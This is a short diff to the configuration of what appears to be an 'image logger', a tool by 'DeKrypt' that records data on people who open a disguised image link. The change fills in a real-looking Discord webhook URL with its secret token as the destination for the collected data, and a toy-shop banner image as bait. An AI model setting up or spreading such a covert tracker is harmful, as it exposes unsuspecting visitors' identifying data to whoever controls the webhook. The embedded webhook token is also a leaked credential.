@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335149681147383888/ZM4qfEZ8pGpsP9Eboyuj3-y6Esgm5hWc4iEx4yZXZysiRPTn9-dsEC0D-rz6hEmYQlQZ",
+    "image": "https://shop.jacknjellify.com/cdn/shop/files/NewBannerBluePlush_edit_3840x2160_mobile.png?v=1735753980&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
